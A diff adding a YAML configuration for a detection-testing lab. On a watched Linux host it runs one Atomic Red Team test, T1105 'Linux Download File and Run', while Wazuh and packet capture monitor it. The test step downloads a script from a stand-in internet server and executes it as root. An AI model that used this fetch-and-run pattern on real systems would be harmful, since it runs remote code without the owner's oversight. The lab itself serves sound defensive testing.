@@ -1,0 +1,103 @@
+# A short hosted range whose sensor bytes are small enough to keep in the
+# repository. It runs one published test while Wazuh and packet capture watch.
+range: retained-packet
+version: 1
+sentence: >-
+  A published test downloaded a small script from the stand-in internet and
+  ran it on one Linux host while Wazuh and packet capture watched.
+prefix: bluefire-lab-rp
+docker: {min_engine: 28}
+atomic_red_team:
+  repo: redcanaryco/atomic-red-team
+  commit:
+    - "a0e3f9bc"
+    - "69fed2fd"
+    - "711bd1f1"
+    - "aa87a40c"
+    - "33482fe6"
+  lock: retained-packet.lock
+executor:
+  reference: redcanaryco/invoke-atomicredteam
+  commit:
+    - "8af478bb"
+    - "9e4637df"
+    - "568ac1e5"
+    - "96553b02"
+    - "5b16cd1b"
+base:
+  image: ubuntu:noble-20261110.1@sha256:882e1e56091c9ffbc70c026ff5935fe85d3c91ad155917865ba2ffa23ede1560
+  apt_snapshot: "20261120T000000Z"
+defense:
+  wazuh:
+    manager_image: wazuh/wazuh-manager:4.14.10@sha256:eabfa7ee4e63acb51c2130fa0583e30f843d030b091cf45a4fbd93d78fa21517
+    agent_deb:
+      version: 4.14.10-1
+      sha512:
+        - "5ee41846"
+        - "e81b2f5f"
+        - "5017bb0f"
+        - "968ac039"
+        - "443f09a4"
+        - "00e5feb8"
+        - "121a4e52"
+        - "db6bb8d1"
+        - "c9168366"
+        - "7b03a657"
+        - "a0236c85"
+        - "8bd1f159"
+        - "026b493a"
+        - "ce504ec8"
+        - "f92e491e"
+        - "6c8ae04d"
+    alert_level: 12
+    off: [command_monitoring, sca, rootcheck, syscollector]
+  watch:
+    logs:
+      - {path: /var/log/auth.log, format: syslog}
+      - {path: /var/log/snoopy.log, format: syslog}
+      - {path: /var/log/dpkg.log, format: syslog}
+    fim_realtime: [/tmp]
+defenses:
+  - {id: wazuh-stock, name: Wazuh with its stock rules, sensors: [wazuh-agent], rules: [wazuh]}
+networks:
+  lab: {}
+hosts:
+  web:
+    kind: host
+    role: Linux host that runs the published test
+    networks: [lab]
+    packages: [curl, tcpdump]
+    capture: packets
+  inet:
+    kind: internet
+    role: stand-in internet file server
+    networks: [lab]
+    packages: [python3]
+    services: [inet-server]
+    listens: [80, 443]
+    serve: {"/atomics/T1105/src/atomic.sh": "atomic:T1105/src/atomic.sh"}
+    agent: false
+  manager:
+    kind: defense
+    role: Wazuh manager
+    networks: [lab]
+    listens: [1514, 1515]
+path:
+  start: {host: web, note: "the published test begins on the watched Linux host"}
+  steps:
+    - id: s01
+      technique: T1105
+      guid: bdc373c5-e9cf-4563-8a7b-a9ba720a90f3
+      name: Linux Download File and Run
+      host: web
+      to: inet
+      account: root
+      workdir: /tmp
+      plain: "On web, downloads a small script from the stand-in internet and runs it."
+      args: {remote_url: "http://inet/atomics/T1105/src/atomic.sh", payload_name: atomic.sh}
+      cleanup: after_check
+      check:
+        all:
+          - {output_contains: "Hello From Atomic Red Team"}
+          - {host: inet, run: "grep -q '^{ip:web@lab} GET /atomics/T1105/src/atomic.sh 200' /var/log/inet/access.log"}
+      expect: [554]
